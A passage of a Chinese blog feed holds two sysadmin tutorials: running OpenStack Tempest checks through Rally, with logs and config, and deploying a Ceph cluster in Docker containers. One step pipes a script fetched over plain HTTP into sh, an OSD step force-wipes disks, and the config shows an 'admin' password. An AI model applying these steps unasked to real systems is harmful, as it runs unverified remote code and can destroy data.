class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br><span class="line">| uuid                                 | created_at          | name      | status           | active |</span><br><span class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br><span class="line">| 3403b234-76ae-4afb-9d96-49ef2d872069 | 2017-07-31T07:44:12 | openstack | deploy-&gt;finished | *      |</span><br><span class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br></pre></td></tr></table></figure><h3 id="5-检查-deployment-是否可行"><a href="#5-检查-deployment-是否可行" class="headerlink" title="5. 检查 deployment 是否可行"></a>5. 检查 deployment 是否可行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally deployment check</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Platform openstack:</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Available services:</span><br><span class="line">+-------------+----------------+-----------+</span><br><span class="line">| Service     | Service Type   | Status    |</span><br><span class="line">+-------------+----------------+-----------+</span><br><span class="line">| __unknown__ | alarming       | Available |</span><br><span class="line">| __unknown__ | compute_legacy | Available |</span><br><span class="line">| __unknown__ | event          | Available |</span><br><span class="line">| __unknown__ | placement      | Available |</span><br><span class="line">| __unknown__ | volumev2       | Available |</span><br><span class="line">| __unknown__ | volumev3       | Available |</span><br><span class="line">| cinder      | volume         | Available |</span><br><span class="line">| glance      | image          | Available |</span><br><span class="line">| gnocchi     | metric         | Available |</span><br><span class="line">| keystone    | identity       | Available |</span><br><span class="line">| neutron     | network        | Available |</span><br><span class="line">| nova        | compute        | Available |</span><br><span class="line">+-------------+----------------+-----------+</span><br></pre></td></tr></table></figure><p>关于 service 显示 <strong>unknown</strong> 的问题可以参看以下文章：<br><a href="https://bugs.launchpad.net/rally/+bug/1618121">rally deployment check is giving <em>unknown</em> under services</a><br><a href="http://www.cnblogs.com/wtfbk/p/4316335.html">OpenStack Rally 性能测试</a></p><h2 id="通过-Tempest-verifier-验证云环境"><a href="#通过-Tempest-verifier-验证云环境" class="headerlink" title="通过 Tempest verifier 验证云环境"></a>通过 Tempest verifier 验证云环境</h2><h3 id="1-创建-Tempest-verifier"><a href="#1-创建-Tempest-verifier" class="headerlink" title="1. 创建 Tempest verifier"></a>1. 创建 Tempest verifier</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  rally verify create-verifier --type tempest --name tempest-verifier</span></span><br></pre></td></tr></table></figure><h3 id="2-验证是否安装完成"><a href="#2-验证是否安装完成" class="headerlink" title="2. 验证是否安装完成"></a>2. 验证是否安装完成</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify list-verifiers</span></span><br><span class="line">+--------------------------------------+------------------+---------+-----------+---------------------+---------------------+-----------+---------+-------------+--------+</span><br><span class="line">| UUID                                 | Name             | Type    | Namespace | Created at          | Updated at          | Status    | Version | System-wide | Active |</span><br><span class="line">+--------------------------------------+------------------+---------+-----------+---------------------+---------------------+-----------+---------+-------------+--------+</span><br><span class="line">| 4f4db99c-3930-442e-b592-bed5f428814e | tempest-verifier | tempest | openstack | 2017-07-31T05:24:09 | 2017-07-31T05:25:28 | installed | master  | False       | ✔      |</span><br><span class="line">+--------------------------------------+------------------+---------+-----------+---------------------+---------------------+-----------+---------+-------------+--------+</span><br></pre></td></tr></table></figure><h3 id="3-配置-Tempest-verifier"><a href="#3-配置-Tempest-verifier" class="headerlink" title="3. 配置 Tempest verifier"></a>3. 配置 Tempest verifier</h3><p>执行以下命令为当前部署配置 Tempest verifier</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify configure-verifier</span></span><br><span class="line"></span><br><span class="line">2017-07-31 15:56:33.940 20338 INFO rally.api [-] Configuring verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e) <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069).</span><br><span class="line">2017-07-31 15:56:35.945 20338 INFO rally.api [-] Verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e) has been successfully configured <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069)!</span><br></pre></td></tr></table></figure><p>查看配置信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify configure-verifier --show</span></span><br><span class="line"></span><br><span class="line">[DEFAULT]</span><br><span class="line">debug = True</span><br><span class="line">use_stderr = False</span><br><span class="line">log_file = </span><br><span class="line"></span><br><span class="line">[auth]</span><br><span class="line">use_dynamic_credentials = True</span><br><span class="line">admin_username = admin</span><br><span class="line">admin_password = admin</span><br><span class="line">admin_project_name = admin</span><br><span class="line">admin_domain_name = default</span><br><span class="line">…………</span><br><span class="line">[service_available]</span><br><span class="line">cinder = True</span><br><span class="line">glance = True</span><br><span class="line">heat = False</span><br><span class="line">ironic = False</span><br><span class="line">neutron = True</span><br><span class="line">nova = True</span><br><span class="line">sahara = False</span><br><span class="line">swift = False</span><br><span class="line"></span><br><span class="line">[validation]</span><br><span class="line">run_validation = True</span><br><span class="line">image_ssh_user = cirros</span><br><span class="line">connect_method = floating</span><br><span class="line"></span><br><span class="line">[volume-feature-enabled]</span><br><span class="line">bootable = True</span><br></pre></td></tr></table></figure><h2 id="开始验证"><a href="#开始验证" class="headerlink" title="开始验证"></a>开始验证</h2><h3 id="1-执行以下命令开始验证"><a href="#1-执行以下命令开始验证" class="headerlink" title="1. 执行以下命令开始验证"></a>1. 执行以下命令开始验证</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify start</span></span><br><span class="line">2017-07-31 16:02:14.679 20417 INFO rally.api [-] Starting verification (UUID=ddca5b4b-03a9-49e4-8c91-1d53943ad10b) <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069) by verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e).</span><br><span class="line">2017-07-31 16:02:25.381 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_create_agent ... success [0.752s]</span><br><span class="line">2017-07-31 16:02:25.972 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_delete_agent ... success [0.588s]</span><br><span class="line">2017-07-31 16:02:26.458 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_list_agents ... success [0.486s]</span><br><span class="line">2017-07-31 16:02:27.335 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_list_agents_with_filter ... success [0.877s]</span><br><span class="line">2017-07-31 16:02:27.975 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_update_agent ... success [0.639s]</span><br><span class="line">2017-07-31 16:02:37.491 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_availability_zone.AZAdminV2TestJSON.test_get_availability_zone_list ... success [0.498s]</span><br><span class="line">2017-07-31 16:02:38.042 20417 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_availability_zone.AZAdminV2TestJSON.test_get_availability_zone_list_detail ... success [0.551s]</span><br></pre></td></tr></table></figure><p>默认情况下，以上命令会为当前部署执行完整的 tempest测试。</p><h3 id="2-可以使用-–pattern-选项只执行部分tempest测试"><a href="#2-可以使用-–pattern-选项只执行部分tempest测试" class="headerlink" title="2. 可以使用 –pattern 选项只执行部分tempest测试"></a>2. 可以使用 –pattern 选项只执行部分tempest测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify start --pattern set=compute</span></span><br><span class="line">2017-07-31 16:07:12.163 20459 INFO rally.api [-] Starting verification (UUID=4e36a2fb-5780-4db0-86bf-fe2b0ab92bf2) <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069) by verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e).</span><br><span class="line">2017-07-31 16:07:17.189 20459 INFO tempest-verifier [-] &#123;1&#125; tempest.api.compute.admin.test_auto_allocate_network.AutoAllocateNetworkTest ... skip: The microversion range[2.37 - latest] of this <span class="built_in">test</span> is out of the configuration range[None - None].</span><br><span class="line">2017-07-31 16:07:21.786 20459 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_create_agent ... success [0.836s]</span><br><span class="line">2017-07-31 16:07:23.170 20459 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_delete_agent ... success [1.382s]</span><br><span class="line">2017-07-31 16:07:25.590 20459 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_list_agents ... success [2.422s]</span><br><span class="line">2017-07-31 16:07:27.447 20459 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_list_agents_with_filter ... success [1.856s]</span><br><span class="line">2017-07-31 16:07:28.135 20459 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_agents.AgentsAdminTestJSON.test_update_agent ... success [0.686s]</span><br></pre></td></tr></table></figure><p>如 –pattern set=compute 选项，只会执行compute相关的测试。当前可供选择的测试内容有 <strong>full, smoke, compute, identity, image, network, object_storage, orchestration, volume, scenario</strong></p><h3 id="3-用户可以使用正则表达式运行某些的测试集"><a href="#3-用户可以使用正则表达式运行某些的测试集" class="headerlink" title="3. 用户可以使用正则表达式运行某些的测试集"></a>3. 用户可以使用正则表达式运行某些的测试集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify start --pattern tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON</span></span><br><span class="line">2017-07-31 16:25:55.659 20502 INFO rally.api [-] Starting verification (UUID=84fce1ca-304b-4663-bba5-185f24d013a1) <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069) by verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e).</span><br><span class="line">2017-07-31 16:26:03.792 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_using_string_ram ... success [0.683s]</span><br><span class="line">2017-07-31 16:26:04.703 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_verify_entry_in_list_details ... success [0.910s]</span><br><span class="line">2017-07-31 16:26:05.478 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_with_int_id ... success [0.774s]</span><br><span class="line">2017-07-31 16:26:06.230 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_with_none_id ... success [0.750s]</span><br><span class="line">2017-07-31 16:26:06.906 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_with_uuid_id ... success [0.677s]</span><br><span class="line">2017-07-31 16:26:08.224 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_list_flavor_without_extra_data ... success [1.317s]</span><br><span class="line">2017-07-31 16:26:09.264 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_server_with_non_public_flavor ... success [1.038s]</span><br><span class="line">2017-07-31 16:26:13.144 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_is_public_string_variations ... success [3.873s]</span><br><span class="line">2017-07-31 16:26:14.477 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_list_non_public_flavor ... success [1.336s]</span><br><span class="line">2017-07-31 16:26:15.548 20502 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_list_public_flavor_with_other_user ... success [1.067s]</span><br><span class="line">2017-07-31 16:26:22.767 20502 INFO rally.api [-] Verification (UUID=84fce1ca-304b-4663-bba5-185f24d013a1) has been successfully finished <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069)!</span><br><span class="line"></span><br><span class="line">======</span><br><span class="line">Totals</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">Ran: 10 tests <span class="keyword">in</span> 14.768 sec.</span><br><span class="line"> - Success: 10</span><br><span class="line"> - Skipped: 0</span><br><span class="line"> - Expected failures: 0</span><br><span class="line"> - Unexpected success: 0</span><br><span class="line"> - Failures: 0</span><br><span class="line"></span><br><span class="line">Using verification (UUID=84fce1ca-304b-4663-bba5-185f24d013a1) as the default verification <span class="keyword">for</span> the future operations.</span><br></pre></td></tr></table></figure><p>只会运行compute中和flavor相关的测试</p><h3 id="4-以这种方式，可以从某个目录或类运行测试，甚至可以运行单个测试"><a href="#4-以这种方式，可以从某个目录或类运行测试，甚至可以运行单个测试" class="headerlink" title="4. 以这种方式，可以从某个目录或类运行测试，甚至可以运行单个测试"></a>4. 以这种方式，可以从某个目录或类运行测试，甚至可以运行单个测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify start --pattern tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_using_string_ram</span></span><br><span class="line">2017-07-31 16:30:28.586 20533 INFO rally.api [-] Starting verification (UUID=181d37bd-d9a7-46fa-9311-ffe09d81e84c) <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069) by verifier <span class="string">&#x27;tempest-verifier&#x27;</span> (UUID=4f4db99c-3930-442e-b592-bed5f428814e).</span><br><span class="line">2017-07-31 16:30:36.781 20533 INFO tempest-verifier [-] &#123;0&#125; tempest.api.compute.admin.test_flavors.FlavorsAdminTestJSON.test_create_flavor_using_string_ram ... success [0.772s]</span><br><span class="line">2017-07-31 16:30:42.064 20533 INFO rally.api [-] Verification (UUID=181d37bd-d9a7-46fa-9311-ffe09d81e84c) has been successfully finished <span class="keyword">for</span> deployment <span class="string">&#x27;openstack&#x27;</span> (UUID=3403b234-76ae-4afb-9d96-49ef2d872069)!</span><br><span class="line"></span><br><span class="line">======</span><br><span class="line">Totals</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">Ran: 1 tests <span class="keyword">in</span> 2.734 sec.</span><br><span class="line"> - Success: 1</span><br><span class="line"> - Skipped: 0</span><br><span class="line"> - Expected failures: 0</span><br><span class="line"> - Unexpected success: 0</span><br><span class="line"> - Failures: 0</span><br><span class="line"></span><br><span class="line">Using verification (UUID=181d37bd-d9a7-46fa-9311-ffe09d81e84c) as the default verification <span class="keyword">for</span> the future operations.</span><br></pre></td></tr></table></figure><h2 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h2><p>我们可以报错结果为html、json等格式，一般保存为 html 格式，可以在浏览器中直观的查看</p><h3 id="1-获得-verify-id"><a href="#1-获得-verify-id" class="headerlink" title="1. 获得 verify id"></a>1. 获得 verify id</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify list</span></span><br><span class="line">+--------------------------------------+------+------------------+-----------------+---------------------+---------------------+----------+----------+</span><br><span class="line">| UUID                                 | Tags | Verifier name    | Deployment name | Started at          | Finished at         | Duration | Status   |</span><br><span class="line">+--------------------------------------+------+------------------+-----------------+---------------------+---------------------+----------+----------+</span><br><span class="line">| db55c49c-9316-4353-94db-e0c777831157 | -    | tempest-verifier | openstack       | 2017-07-31T08:37:28 | 2017-07-31T14:40:46 | 6:03:18  | failed   |</span><br><span class="line">+--------------------------------------+------+------------------+-----------------+---------------------+---------------------+----------+----------+</span><br></pre></td></tr></table></figure><p>如果进行了多次测试会有多条劫夺，可以根据时间来区分，每次测试结束的时候都会提示本次测试的UUID</p><h3 id="2-导出为-html-文件"><a href="#2-导出为-html-文件" class="headerlink" title="2. 导出为 html 文件"></a>2. 导出为 html 文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally verify report --uuid db55c49c-9316-4353-94db-e0c777831157 --type html --to export-name.html</span></span><br></pre></td></tr></table></figure><h3 id="3-在浏览器中查看"><a href="#3-在浏览器中查看" class="headerlink" title="3. 在浏览器中查看"></a>3. 在浏览器中查看</h3><p>如图，可以显示所有的测试用例，错误的用例也会给出详细的错误信息<br><img data-src="/images/uploads/2017/09/3580198831.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> rally </tag>
            
            <tag> tempest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 docker 快速部署 ceph</title>
      <link href="docker/use-docker-deploy-ceph.html"/>
      <url>docker/use-docker-deploy-ceph.html</url>
      
        <content type="html"><![CDATA[<h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>至少需要三台虚拟机或者物理机，这里使用虚拟机</li><li>每台虚拟机至少需要两块硬盘（一块系统盘，一块OSD），本例中有三块硬盘</li></ul><h3 id="1-部署流程"><a href="#1-部署流程" class="headerlink" title="1. 部署流程"></a>1. 部署流程</h3><p>博客使用的markdown解析器不支持流程图使用图片代替<br><img data-src="/images/uploads/2017/06/89293182.png" alt="liuchengtu.png"></p><h3 id="2-主机规划"><a href="#2-主机规划" class="headerlink" title="2. 主机规划"></a>2. 主机规划</h3><p><img data-src="/images/uploads/2017/06/419662942.png" alt="biaoge.png"></p><h2 id="安装-docker"><a href="#安装-docker" class="headerlink" title="安装 docker"></a>安装 docker</h2><p>登录 <a href="https://cr.console.aliyun.com/#/accelerator">https://cr.console.aliyun.com/#/accelerator</a> 获取自己的阿里云 docker 加速地址</p><h3 id="1-安装升级-docker-客户端"><a href="#1-安装升级-docker-客户端" class="headerlink" title="1. 安装升级 docker 客户端"></a>1. 安装升级 docker 客户端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -</span></span><br></pre></td></tr></table></figure><h3 id="2-使用-docker-加速器"><a href="#2-使用-docker-加速器" class="headerlink" title="2. 使用 docker 加速器"></a>2. 使用 docker 加速器</h3><p>可以通过修改 daemon 配置文件 /etc/docker/daemon.json 来使用加速器，注意修改使用自己的加速地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mkdir -p /etc/docker</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://******.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl daemon-reload</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl restart docker</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl <span class="built_in">enable</span> docker</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="启动-MON"><a href="#启动-MON" class="headerlink" title="启动 MON"></a>启动 MON</h2><h3 id="1-下载-ceph-daemon-镜像"><a href="#1-下载-ceph-daemon-镜像" class="headerlink" title="1. 下载 ceph daemon 镜像"></a>1. 下载 ceph daemon 镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker pull ceph/daemon</span></span><br></pre></td></tr></table></figure><h3 id="2-启动第一个-mon"><a href="#2-启动第一个-mon" class="headerlink" title="2. 启动第一个 mon"></a>2. 启动第一个 mon</h3><p>在 node1 上启动第一个 mon,注意修改 MON_IP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -e MON_IP=192.168.3.123 \</span></span><br><span class="line"><span class="bash">        -e CEPH_PUBLIC_NETWORK=192.168.3.0/24 \</span></span><br><span class="line"><span class="bash">        ceph/daemon mon</span></span><br></pre></td></tr></table></figure><p>查看容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                CREATED              STATUS              PORTS               NAMES</span><br><span class="line">b79a02c40296        ceph/daemon         &quot;/entrypoint.sh mon&quot;   About a minute ago   Up About a minute                       sad_shannon</span><br></pre></td></tr></table></figure><p>查看集群状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker <span class="built_in">exec</span> b79a02 ceph -s</span></span><br><span class="line">    cluster 96ae62d2-2249-4173-9dee-3a7215cba51c</span><br><span class="line">     health HEALTH_ERR</span><br><span class="line">            no osds</span><br><span class="line">     monmap e2: 1 mons at &#123;node01=192.168.3.123:6789/0&#125;</span><br><span class="line">            election epoch 4, quorum 0 node01</span><br><span class="line">        mgr no daemons active </span><br><span class="line">     osdmap e1: 0 osds: 0 up, 0 in</span><br><span class="line">            flags sortbitwise,require_jewel_osds,require_kraken_osds</span><br><span class="line">      pgmap v2: 64 pgs, 1 pools, 0 bytes data, 0 objects</span><br><span class="line">            0 kB used, 0 kB / 0 kB avail</span><br><span class="line">                  64 creating</span><br></pre></td></tr></table></figure><h3 id="2-复制配置文件"><a href="#2-复制配置文件" class="headerlink" title="2. 复制配置文件"></a>2. 复制配置文件</h3><p>将 node1 上的配置文件复制到 node02 和 node03,复制的路径包含/etc/ceph和/var/lib/ceph/bootstrap-*下的所有内容。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ssh root@node2 mkdir -p /var/lib/ceph</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> scp -r /etc/ceph root@node2:/etc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> scp -r /var/lib/ceph/bootstrap* root@node2:/var/lib/ceph</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh root@node3 mkdir -p /var/lib/ceph</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> scp -r /etc/ceph root@node3:/etc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> scp -r /var/lib/ceph/bootstrap* root@node3:/var/lib/ceph</span></span><br></pre></td></tr></table></figure><h3 id="3-启动第二个和第三个-mon"><a href="#3-启动第二个和第三个-mon" class="headerlink" title="3. 启动第二个和第三个 mon"></a>3. 启动第二个和第三个 mon</h3><p>在 node02 上执行以下命令启动 mon,注意修改 MON_IP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -e MON_IP=192.168.3.124 \</span></span><br><span class="line"><span class="bash">        -e CEPH_PUBLIC_NETWORK=192.168.3.0/24 \</span></span><br><span class="line"><span class="bash">        ceph/daemon mon</span></span><br></pre></td></tr></table></figure><p>在 node03 上执行以下命令启动 mon,注意修改 MON_IP</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -e MON_IP=192.168.3.125 \</span></span><br><span class="line"><span class="bash">        -e CEPH_PUBLIC_NETWORK=192.168.3.0/24 \</span></span><br><span class="line"><span class="bash">        ceph/daemon mon</span></span><br></pre></td></tr></table></figure><p>查看在 node01 上集群状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker <span class="built_in">exec</span> b79a02 ceph -s</span></span><br><span class="line">    cluster 96ae62d2-2249-4173-9dee-3a7215cba51c</span><br><span class="line">     health HEALTH_ERR</span><br><span class="line">            64 pgs are stuck inactive for more than 300 seconds</span><br><span class="line">            64 pgs stuck inactive</span><br><span class="line">            64 pgs stuck unclean</span><br><span class="line">            no osds</span><br><span class="line">     monmap e4: 3 mons at &#123;node01=192.168.3.123:6789/0,node02=192.168.3.124:6789/0,node03=192.168.3.125:6789/0&#125;</span><br><span class="line">            election epoch 12, quorum 0,1,2 node01,node02,node03</span><br><span class="line">        mgr no daemons active </span><br><span class="line">     osdmap e1: 0 osds: 0 up, 0 in</span><br><span class="line">            flags sortbitwise,require_jewel_osds,require_kraken_osds</span><br><span class="line">      pgmap v2: 64 pgs, 1 pools, 0 bytes data, 0 objects</span><br><span class="line">            0 kB used, 0 kB / 0 kB avail</span><br><span class="line">                  64 creating</span><br></pre></td></tr></table></figure><p>可以看到三个 mon 已经正确启动</p><h2 id="启动-OSD"><a href="#启动-OSD" class="headerlink" title="启动 OSD"></a>启动 OSD</h2><p>每台虚拟机准备了两块磁盘作为 osd,分别加入到集群,注意修改磁盘</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -v /dev/:/dev/ \</span></span><br><span class="line"><span class="bash">        --privileged=<span class="literal">true</span> \</span></span><br><span class="line"><span class="bash">        -e OSD_FORCE_ZAP=1 \</span></span><br><span class="line"><span class="bash">        -e OSD_DEVICE=/dev/sdb \</span></span><br><span class="line"><span class="bash">        ceph/daemon osd_ceph_disk</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -v /dev/:/dev/ \</span></span><br><span class="line"><span class="bash">        --privileged=<span class="literal">true</span> \</span></span><br><span class="line"><span class="bash">        -e OSD_FORCE_ZAP=1 \</span></span><br><span class="line"><span class="bash">        -e OSD_DEVICE=/dev/sdc \</span></span><br><span class="line"><span class="bash">        ceph/daemon osd_ceph_disk</span></span><br></pre></td></tr></table></figure><p>按照同样方法将 node02 和 node03 的 sdb、sdc 都加入集群</p><p>查看集群状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker <span class="built_in">exec</span> b79a ceph -s</span></span><br><span class="line">    cluster 96ae62d2-2249-4173-9dee-3a7215cba51c</span><br><span class="line">     health HEALTH_OK</span><br><span class="line">     monmap e4: 3 mons at &#123;node01=192.168.3.123:6789/0,node02=192.168.3.124:6789/0,node03=192.168.3.125:6789/0&#125;</span><br><span class="line">            election epoch 12, quorum 0,1,2 node01,node02,node03</span><br><span class="line">        mgr no daemons active </span><br><span class="line">     osdmap e63: 6 osds: 6 up, 6 in</span><br><span class="line">            flags sortbitwise,require_jewel_osds,require_kraken_osds</span><br><span class="line">      pgmap v157: 64 pgs, 1 pools, 0 bytes data, 0 objects</span><br><span class="line">            212 MB used, 598 GB / 599 GB avail</span><br><span class="line">                  64 active+clean</span><br></pre></td></tr></table></figure><p>可以看到 mon 和 osd 都已经正确配置，切集群状态为 HEALTH_OK</p><h2 id="创建-MDS"><a href="#创建-MDS" class="headerlink" title="创建 MDS"></a>创建 MDS</h2><p>使用以下命令在 node01 上启动 mds</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker run -d \</span></span><br><span class="line"><span class="bash">        --net=host \</span></span><br><span class="line"><span class="bash">        -v /etc/ceph:/etc/ceph \</span></span><br><span class="line"><span class="bash">        -v /var/lib/ceph/:/var/lib/ceph/ \</span></span><br><span class="line"><span class="bash">        -e CEPHFS_CREATE=1 \</span></span><br><span class="line"><span class="bash">        ceph/daemon mds</span></span><br></pre></td></tr></table></figure><h2 id="启动-RGW-并且映射-80-端口"><a href="#启动-RGW-并且映射-80-端口" class="headerlink" title="启动 RGW ,并且映射 80 端口"></a>启动 RGW ,并且映射 80 端口</h2><p>使用以下命令在 node01 上启动 